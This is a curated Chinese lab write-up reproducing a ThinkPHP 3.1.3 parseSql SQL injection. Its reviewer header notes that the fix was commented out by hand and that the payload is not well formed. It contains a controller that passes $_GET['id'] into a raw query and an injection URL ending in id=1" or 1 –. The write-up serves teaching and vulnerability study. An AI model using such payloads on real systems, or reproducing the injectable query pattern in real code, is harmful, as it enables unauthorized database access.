---
source: "hatch 补库批 20260928"
product: "ThinkPHP / parseSql 演示"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
version: "ThinkPHP 3.1.3 人为注释修复后的实验；原版影响待核"
title: "Thinkphp 3.1.3 sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：标题3.1.3，但作者先注释修复语句，不能证明原版3.1.3受影响"
side_effects: "未执行；本文需注意的操作影响：明确更正：作者明确先注释修复语句，本实验应标教学故障注入，不能作为未修改 ThinkPHP 3.1.3 受影响证据。具体被删除代码只在图中，未猜补；原载荷中的长破折号不是标准 SQL 注释写法，未修成攻击载荷。"
source_status: "unknown"
id: "vw-c5d18ad80ec35dc3391160c9"
entity_id: "ve-c5d18ad80ec35dc3391160c9"
schema_version: "1"
---

## 核对与使用边界

- 明确更正：作者明确先注释修复语句，本实验应标教学故障注入，不能作为未修改 ThinkPHP 3.1.3 受影响证据。具体被删除代码只在图中，未猜补；原载荷中的长破折号不是标准 SQL 注释写法，未修成攻击载荷。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：标题3.1.3，但作者先注释修复语句，不能证明原版3.1.3受影响

代码与实验材料：有数据库和控制器，环境被人为去掉修复；最终SQL载荷含非ASCII破折号

来源证据范围：引用freesion转载无原始修复信息

- **实验改动边界（1）**：人为移除修复后复现被当成原版漏洞；依据：明确写“将这一条修复语句注释后开始”，必须标教学故障注入，不可用作原版影响证据。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **操作与副作用边界（2）**：关键被删除修复语句只在图片；依据：无法静态正文确认修改内容或提交；应给前后差异。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **实验改动边界（3）**：SQL载荷及环境不完整；依据：id=1" or 1 – 用破折号不是标准SQL注释，未附表结构/原始包哈希。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 3.1.3 sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Thinkphp 3.1.3

三、复现过程
------------

首先在网上下载对应的压缩包。

漏洞位于`ThinkPHP/Lib/Core/Model.class.php` 文件的parseSql函数

将这一条修复语句注释后开始一步步复现

![1.png](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId24.png)

在ThinkPHP目录下创建app文件夹后创建index.php

![2.png](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId25.png)

访问相应页面，显示这个则说明成功。

![3.png](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId26.png)

成功后app文件夹下会生成工程文件

![4.png](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId27.png)

然后开始配置数据库(在app/conf/config.php下配置)

    <?php
    return array(
        //'配置项'=>'配置值'
    // 添加数据库配置信息
    'DB_TYPE'   => 'mysql', // 数据库类型
    'DB_HOST'   => 'localhost', // 服务器地址
    'DB_NAME'   => 'security', // 数据库名
    'DB_USER'   => 'root', // 用户名
    'DB_PWD'    => 'root', // 密码
    'DB_PORT'   => 3306, // 端口
    'DB_PREFIX' => 'think_', // 数据库表前缀
    );
    ?>

下一步开始为模块定义一个控制器类:`IndexAction.class.php`。命名规范（模块名+Action.class.php）

    <?php
    // 本类由系统自动生成，仅供测试用途
    class IndexAction extends Action {
        public function index(){
          //$this->name = 'thinkphp'; // 进行模板变量赋值
          //$this->display();
            
        $Data = M('Data'); // 实例化Data数据模型
        $this->data = $Data->select();
        $this->display();
        
        $model=M('think_data');
        $m=$model->query('select * from think_data where id="%s"',array($_GET['id']));
        dump($m);exit;
        }
        
    }

创建视图：在`./Tpl`下创建`Index/index.html`

    <html>
     <head>
       <title></title>
     </head>
     <body>
        //<p>hello, {$name}!</p>
        <volist name="data" id="vo">
        {$vo.id}--{$vo.data}<br/>
        </volist>
     </body>
    </html>

> 在浏览器访问

`https://www.0-sec.org:9090/ThinkPHP_3.1.3_full/ThinkPHP/app/`

![5.png](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId28.png)

`https://www.0-sec.org:9090/ThinkPHP_3.1.3_full/ThinkPHP/app/?id=1" or 1 –`

![6.png](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId29.png)

复现结束

参考连接
--------

> https://www.freesion.com/article/3289785672/
